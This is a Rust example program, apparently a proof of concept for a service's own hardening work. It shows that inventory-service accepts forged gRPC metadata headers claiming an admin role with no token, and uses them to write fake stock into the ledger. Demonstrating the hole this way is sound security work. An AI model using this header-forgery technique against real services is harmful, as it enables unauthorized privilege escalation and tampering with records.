// Demonstrates the trust boundary hole this system has carried since inventory
// first started reading identity from gRPC metadata.
//
// It calls inventory-service DIRECTLY, bypassing the gateway, and simply asserts
// it is an admin. No password, no token, no JWT - just three metadata headers
// that the gateway would normally have derived from a verified token.
//
//   cargo run -p inventory-service --example forge -- <warehouse_id> <product_id>
//
// Before hardening: this succeeds and writes real stock into the ledger.
// After hardening:  this is rejected with Unauthenticated.
use tonic::Request;
use tonic::metadata::MetadataValue;
use wms_proto::inventory::v1::inventory_service_client::InventoryServiceClient;
use wms_proto::inventory::v1::{ReceiptItem, ReceiveStockRequest};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let mut args = std::env::args().skip(1);
    let warehouse_id: i64 = args.next().unwrap_or_default().parse().unwrap_or(1);
    let product_id: i64 = args.next().unwrap_or_default().parse().unwrap_or(1);
    let url = std::env::var("INVENTORY_URL")
        .unwrap_or_else(|_| "http://127.0.0.1:50054".to_string());

    let mut client = InventoryServiceClient::connect(url.clone()).await?;

    let mut request = Request::new(ReceiveStockRequest {
        warehouse_id,
        reference_no: Some("FORGED".to_string()),
        items: vec![ReceiptItem {
            product_id,
            quantity: 9999,
            unit_cost: 0,
        }],
        idempotency_key: format!("forged-{}", chrono::Utc::now().timestamp_nanos_opt().unwrap_or(0)),
    });

    // This is the entire attack. No credential of any kind.
    let metadata = request.metadata_mut();
    metadata.insert("x-user-id", MetadataValue::try_from("999")?);
    metadata.insert("x-user-email", MetadataValue::try_from("attacker@evil.test")?);
    metadata.insert("x-user-roles", MetadataValue::try_from("admin")?);

    println!("calling {url} directly, claiming to be admin with no token...");

    match client.receive_stock(request).await {
        Ok(response) => {
            let receipt = response.into_inner();
            println!(
                "  ACCEPTED. receipt_id={} wrote {} units of product {} into warehouse {}",
                receipt.receipt_id, 9999, product_id, warehouse_id
            );
            println!("  The gateway was never involved. No password was ever checked.");
        }
        Err(status) => {
            println!("  REJECTED: {} - {}", status.code(), status.message());
        }
    }

    Ok(())
}
